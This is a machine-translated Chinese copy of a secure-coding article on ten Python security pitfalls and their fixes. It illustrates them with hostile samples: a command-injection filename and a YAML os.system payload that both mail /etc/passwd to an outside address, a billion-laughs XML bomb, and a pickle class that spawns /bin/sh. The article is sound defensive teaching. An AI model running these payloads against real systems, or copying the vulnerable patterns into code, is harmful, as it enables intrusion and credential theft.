<html>
<head>
<title>10 common security gotchas in Python and how to avoid them</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Python中的10个常见安全陷阱以及如何避免它们</h1>
<blockquote>原文：<a href="https://medium.com/hackernoon/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03?source=collection_archive---------2-----------------------#2018-06-18">https://medium.com/hackernoon/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03?source=collection_archive---------2-----------------------#2018-06-18</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><div class=""/><figure class="fi fk is it iu iv fe ff paragraph-image"><div role="button" tabindex="0" class="iw ix di iy bf iz"><div class="fe ff ir"><img src="../Images/96cd7896fea3439a4d980338edfa4078.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lHHCVCZ-WmKnpnX04KLsGg.jpeg"/></div></div></figure><p id="bb15" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">编写安全代码很难。当你学习一门语言、一个模块或一个框架时，你学习如何使用<strong class="je hv"><em class="ka"/></strong>。在考虑安全性时，您需要考虑如何滥用<strong class="je hv"><em class="ka"/></strong>。Python也不例外，甚至在标准库中也有关于编写强化应用程序的不良实践。然而，当我与许多Python开发者交谈时，他们根本不知道这些。</p><p id="f1d0" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">以下是我的前10个<em class="ka">，排名不分先后</em>，Python应用中常见的陷阱。</p><h1 id="6f03" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">1.输入注入</h1><p id="2b1f" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">注入式攻击范围很广，非常普遍，而且有很多种类型。它们影响所有的语言、框架和环境。</p><p id="88d5" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je hv"> SQL注入</strong>是您直接编写SQL查询的地方，而不是使用ORM和混合字符串与变量。我读过很多代码，其中“转义引号”被认为是一种修复。<strong class="je hv">不是。</strong>通过这张备忘单让自己熟悉SQL注入可能发生的所有复杂情况。</p><p id="e144" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><strong class="je hv">命令注入</strong>是指任何时候你使用popen、subprocess、os.system调用一个进程，并从变量中获取参数。当调用本地命令时，有人可能会恶意设置这些值。</p><p id="88e5" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">想象一下这个简单的脚本<a class="ae le" href="https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html" rel="noopener ugc nofollow" target="_blank">【信用】</a>。您使用用户提供的文件名调用子流程:</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="af78" class="lo kc hu lk b fv lp lq l lr ls">import subprocess<br/><br/><strong class="lk hv">def</strong> <strong class="lk hv">transcode_file</strong>(request, filename):<br/>    command <strong class="lk hv">=</strong> 'ffmpeg -i "{source}" output_file.mpg'<strong class="lk hv">.</strong>format(source<strong class="lk hv">=</strong>filename)<br/>    subprocess<strong class="lk hv">.</strong>call(command, shell<strong class="lk hv">=</strong>True)  <em class="ka"># a bad idea!</em></span></pre><p id="5dfc" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">攻击者将filename的值设置为<code class="eh lt lu lv lk b">"; cat /etc/passwd | mail them@domain.com</code>或其他同样危险的值。</p><h2 id="5243" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="c004" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用web框架附带的实用程序(如果您正在使用的话)来清理输入。除非你有充分的理由，否则不要手工构造SQL查询。大多数ORM都有内置的杀毒方法。</p><p id="7509" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">对于外壳，使用<code class="eh lt lu lv lk b">shlex</code>模块将<a class="ae le" href="https://docs.python.org/3/library/shlex.html#shlex.quote" rel="noopener ugc nofollow" target="_blank">正确退出输入</a>。</p><h1 id="585c" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">2.解析XML</h1><p id="f6fa" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">如果您的应用程序曾经加载和解析过XML文件，那么您很可能正在使用XML标准库模块之一。通过XML有一些常见的攻击。大部分是DoS风格的(旨在使系统崩溃，而不是泄漏数据)。这些攻击很常见，尤其是当你解析外部的XML文件时。</p><p id="d1ad" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">其中之一被称为“十亿次大笑”，因为有效载荷通常包含许多(数十亿次)“大笑”。基本上，这个想法是你可以在XML中引用实体，所以当你谦逊的XML解析器试图将这个XML文件加载到内存中时，它会消耗<strong class="je hv">千兆字节的内存。</strong>不信你试试:-)</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="73c2" class="lo kc hu lk b fv lp lq l lr ls">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE lolz [<br/>  &lt;!ENTITY lol "lol"&gt;<br/>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br/>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br/>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br/>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br/>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br/>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br/>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br/>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br/>]&gt;<br/>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span></pre><p id="6964" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">另一种攻击使用<strong class="je hv">外部实体扩展</strong>。XML支持从外部URL引用实体，XML解析器通常会毫无顾虑地获取和加载该资源。攻击者可以绕过防火墙并获得对受限资源的访问权限，因为所有请求都是从内部可信的IP地址发出的，而不是从外部发出的</p><p id="068e" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">另一个要考虑的情况是你依赖的解码XML的第三方包，比如配置文件，远程API。您甚至可能没有意识到，您的某个依赖项使自己暴露在这些类型的攻击之下。</p><p id="eba5" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">那么Python中会发生什么呢？嗯，标准的库模块，etree、DOM、xmlrpc都很容易受到这些类型的攻击。这是有据可查的<a class="ae le" href="https://docs.python.org/3/library/xml.html#xml-vulnerabilities" rel="noopener ugc nofollow" target="_blank">https://docs . python . org/3/library/XML . html # XML-vulnerabilities</a></p><h2 id="ffa2" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="f2cf" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用<a class="ae le" href="https://pypi.org/project/defusedxml/" rel="noopener ugc nofollow" target="_blank">defusexml</a>作为标准库模块的直接替代。它增加了抵御这类攻击的安全措施。</p><h1 id="91f9" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">3.断言语句</h1><p id="52da" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">不要使用断言语句来防止用户不应该访问的代码片段。举个简单的例子</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="e4ec" class="lo kc hu lk b fv lp lq l lr ls">def foo(request, user):<br/>   assert user.is_admin, “user does not have access”<br/>   # secure code...</span></pre><p id="0dcc" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">现在，默认情况下Python以<code class="eh lt lu lv lk b">__debug__</code>为真执行，但是在生产环境中，以优化方式运行是很常见的。这将<strong class="je hv">跳过断言</strong>语句，直接进入安全代码，而不管用户<code class="eh lt lu lv lk b">is_admin</code>是否。</p><h2 id="da24" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="4562" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">仅使用assert语句与其他开发人员通信，例如在单元测试或中，以防止不正确的API使用。</p><h1 id="e90c" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">4.定时攻击</h1><p id="692b" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">计时攻击本质上是一种通过计时比较所提供的值需要多长时间来暴露行为和算法的方式。定时攻击需要精确性，因此它们通常不会在高延迟的远程网络上起作用。由于大多数web应用程序都有可变的延迟，所以编写一个针对HTTP web服务器的定时攻击几乎是不可能的。</p><p id="1290" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">但是，如果您有一个提示输入密码的命令行应用程序，攻击者可以编写一个简单的脚本来计算将密码值与实际密码进行比较所需的时间。<a class="ae le" href="http://jyx.github.io/blog/2014/02/02/timing-attack-proof-of-concept/" rel="noopener ugc nofollow" target="_blank">举例</a>。</p><p id="b468" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">有一些令人印象深刻的例子，如<a class="ae le" href="https://github.com/c0r3dump3d/osueta" rel="noopener ugc nofollow" target="_blank">这个基于SSH的定时攻击</a>是用Python写的，如果你想看看它们是如何工作的。</p><h2 id="2eeb" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="5d66" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用Python 3.5中引入的<code class="eh lt lu lv lk b">secrets.compare_digest</code>、<a class="ae le" href="https://docs.python.org/3/library/secrets.html#secrets.compare_digest" rel="noopener ugc nofollow" target="_blank"/>比较密码和其他私有值。</p><h1 id="a919" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">5.受污染的站点包或导入路径</h1><p id="a1f4" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">Python的导入系统非常灵活。当你试图为你的测试编写猴子补丁，或者重载核心功能时，这是非常好的。</p><p id="6e8b" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">但是，这是Python中最大的安全漏洞之一。</p><p id="49ac" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">将第三方包安装到您的站点包中，无论是在虚拟环境中还是在全局站点包中(通常不鼓励这样做)，都会使您暴露于这些包中的安全漏洞。</p><p id="49b2" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">已经出现了发布到PyPi的包，它们的名字与流行的包相似，但却是执行任意代码的<a class="ae le" href="http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/" rel="noopener ugc nofollow" target="_blank">。最大的发生率，幸运的是没有伤害，只是“提出了一个观点”,这个问题并没有真正得到解决..</a></p><p id="b702" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">另一个要考虑的情况是你的依赖关系的依赖关系(等等)。它们可能包含漏洞，也可能通过导入系统覆盖Python中的默认行为。</p><h2 id="0ff9" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="8b23" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">检查你的包裹。<a class="ae le" href="http://pyup.io/" rel="noopener ugc nofollow" target="_blank">看看PyUp.io和他们的安全服务</a>。对所有应用程序使用虚拟环境，并确保您的全球站点包尽可能干净。检查包裹签名。</p><h1 id="3e39" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">6.临时文件</h1><p id="8be7" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">要在Python中创建临时文件，通常要使用<code class="eh lt lu lv lk b"><a class="ae le" href="https://docs.python.org/3/library/tempfile.html#tempfile.mktemp" rel="noopener ugc nofollow" target="_blank">mktemp()</a></code>函数生成一个文件名，然后使用这个名称创建一个文件。这是不安全的，因为在第一个进程调用<code class="eh lt lu lv lk b"><a class="ae le" href="https://docs.python.org/3/library/tempfile.html#tempfile.mktemp" rel="noopener ugc nofollow" target="_blank">mktemp()</a></code>和随后尝试创建文件之间，另一个进程<strong class="je hv">可能会创建一个同名文件</strong><a class="ae le" href="https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables" rel="noopener ugc nofollow" target="_blank">【1】</a>这意味着它可能会欺骗您的应用程序加载错误的数据或暴露其他临时数据。</p><p id="b04d" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">如果您调用不正确的方法，Python的最新版本将会发出运行时警告。</p><h2 id="a7e7" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="6663" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用<code class="eh lt lu lv lk b">tempfile</code> <a class="ae le" href="https://docs.python.org/3/library/tempfile.html#tempfile.mkstemp" rel="noopener ugc nofollow" target="_blank">模块，如果需要生成临时文件，使用</a> <code class="eh lt lu lv lk b">mkstemp</code>。</p><h1 id="57dc" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">7.使用yaml.load</h1><p id="05fe" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">引用PyYAML文档:</p><blockquote class="mj mk ml"><p id="c676" class="jc jd ka je b jf jg jh ji jj jk jl jm mm jo jp jq mn js jt ju mo jw jx jy jz hn dt translated"><strong class="je hv">"警告:使用从不可信来源接收的任何数据调用</strong> <code class="eh lt lu lv lk b"><strong class="je hv">yaml.load</strong></code> <strong class="je hv">是不安全的！</strong> <code class="eh lt lu lv lk b"><strong class="je hv">yaml.load</strong></code> <strong class="je hv">和</strong> <code class="eh lt lu lv lk b"><strong class="je hv">pickle.load</strong></code> <strong class="je hv">一样强大，所以可以调用任何Python函数。”</strong></p></blockquote><p id="c7f2" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这个漂亮的<a class="ae le" href="https://www.talosintelligence.com/reports/TALOS-2017-0305" rel="noopener ugc nofollow" target="_blank">例子是在流行的Python项目Ansible中找到的</a>。您可以为Ansible Vault提供该值作为(有效)YAML。它用文件中提供的参数调用<code class="eh lt lu lv lk b">os.system()</code>。</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="acdf" class="lo kc hu lk b fv lp lq l lr ls">!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]</span></pre><p id="56c8" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">因此，从用户提供的值有效地加载YAML文件会使您容易受到攻击。</p><figure class="lf lg lh li fq iv"><div class="bz el l di"><div class="mp mq l"/></div><figcaption class="mr ms fg fe ff mt mu bd b be z ek">Demo of this in action, credit Anthony Sottile</figcaption></figure><h2 id="ae06" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="541a" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用<code class="eh lt lu lv lk b">yaml.safe_load</code>，除非你有一个非常好的理由。</p><h1 id="190e" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">8.泡菜</h1><p id="bcb5" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">反序列化pickle数据和YAML一样糟糕。Python类可以声明一个名为<code class="eh lt lu lv lk b">__reduce__</code>的神奇方法，该方法返回一个字符串，或者一个元组，该元组具有可调用性和pickling时要调用的参数。攻击者可以利用它来引用其中一个子进程模块，从而在主机上运行任意命令。</p><p id="085a" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">这个精彩的例子展示了如何在Python 2中处理一个打开外壳的类。关于如何利用泡菜的例子还有很多。</p><pre class="lf lg lh li fq lj lk ll lm aw ln dt"><span id="0183" class="lo kc hu lk b fv lp lq l lr ls">import cPickle<br/>import subprocess<br/>import base64<br/><br/>class RunBinSh(object):<br/>  def __reduce__(self):<br/>    return (subprocess.Popen, (('/bin/sh',),))<br/><br/>print base64.b64encode(cPickle.dumps(RunBinSh()))</span></pre><h2 id="057c" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="5991" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">永远不要从不受信任或未经验证的来源中提取数据。请使用另一种序列化模式，比如JSON。</p><h1 id="9967" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">9.使用系统Python运行时，而不是修补它</h1><p id="2ae3" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">大多数POSIX系统都有Python 2版本。通常是旧的。</p><p id="2fc1" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">由于“Python”，即CPython是用C写的，所以有时候Python解释器本身就有漏洞。C #中常见的安全问题与内存分配有关，因此缓冲区溢出错误。</p><p id="4137" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">多年来，CPython有许多溢出或溢出漏洞，每个漏洞都在后续版本中得到了修补和修复。</p><p id="2ef6" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">所以你是安全的。也就是说，如果你<strong class="je hv"> <em class="ka">给你的运行时</em> </strong>打补丁。</p><p id="0703" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated"><a class="ae le" href="https://www.cvedetails.com/cve/CVE-2017-1000158/" rel="noopener ugc nofollow" target="_blank">下面是2.7.13及以下版本</a>的一个例子，一个整数溢出漏洞，使代码执行。<a class="ae le" href="https://distrowatch.com/table.php?distribution=ubuntu" rel="noopener ugc nofollow" target="_blank">这几乎是Ubuntu 17之前的任何未打补丁版本。</a></p><h2 id="9c5b" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="45a4" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">为您的生产应用程序安装最新版本的Python，<strong class="je hv">并打补丁！</strong></p><h1 id="0f5a" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">10.不修补您的依赖项</h1><p id="035c" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">类似于不给你的运行时打补丁，你也需要定期给你的依赖打补丁。</p><p id="5a5d" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我发现将PyPi的Python包版本“钉”在包中的做法很可怕。想法是“<em class="ka">这些是工作的版本</em>”，所以每个人都不去管它。</p><p id="aa47" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">我上面提到的代码中的所有漏洞，当它们存在于您的应用程序所使用的包中时，都是同样重要的。那些包的开发者修复安全问题。<strong class="je hv">一直</strong>。</p><h2 id="b5d4" class="lo kc hu bd kd lw lx ly kh lz ma mb kl jn mc md kp jr me mf kt jv mg mh kx mi dt translated">修复:</h2><p id="e626" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">使用PyUp.io这样的服务来检查更新，向您的应用程序发出拉/合并请求，并运行您的测试来保持包是最新的。</p><p id="256d" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">使用InSpec之类的工具<a class="ae le" href="https://www.inspec.io/docs/reference/resources/pip/" rel="noopener ugc nofollow" target="_blank">在生产</a>环境中验证安装的版本，并确保修补最低版本或版本范围。</p><h1 id="407b" class="kb kc hu bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky dt translated">你试过强盗吗？</h1><p id="dbca" class="pw-post-body-paragraph jc jd hu je b jf kz jh ji jj la jl jm jn lb jp jq jr lc jt ju jv ld jx jy jz hn dt translated">有一个很棒的静态linter可以捕捉你代码中的所有这些问题，甚至更多！</p><p id="b978" class="pw-post-body-paragraph jc jd hu je b jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz hn dt translated">叫土匪，就<code class="eh lt lu lv lk b">pip install bandit</code>和<code class="eh lt lu lv lk b">bandit ./codedir</code></p><div class="mv mw fm fo mx my"><a href="https://github.com/PyCQA/bandit" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab ej"><div class="na ab nb cl cj nc"><h2 class="bd hv fv z el nd eo ep ne er et ht dt translated">PyCQA/bandit</h2><div class="nf l"><h3 class="bd b fv z el nd eo ep ne er et ek translated">bandit - Bandit是一个用来发现Python代码中常见安全问题的工具。</h3></div><div class="ng l"><p class="bd b gc z el nd eo ep ne er et ek translated">github.com</p></div></div><div class="nh l"><div class="ni l nj nk nl nh nm ja my"/></div></div></a></div><blockquote class="mj mk ml"><p id="0092" class="jc jd ka je b jf jg jh ji jj jk jl jm mm jo jp jq mn js jt ju mo jw jx jy jz hn dt translated">我在一些研究中使用的这篇<a class="ae le" href="https://access.redhat.com/blogs/766093/posts/2592591" rel="noopener ugc nofollow" target="_blank">伟大的文章</a>归功于RedHat。</p></blockquote></div></div>    
</body>
</html>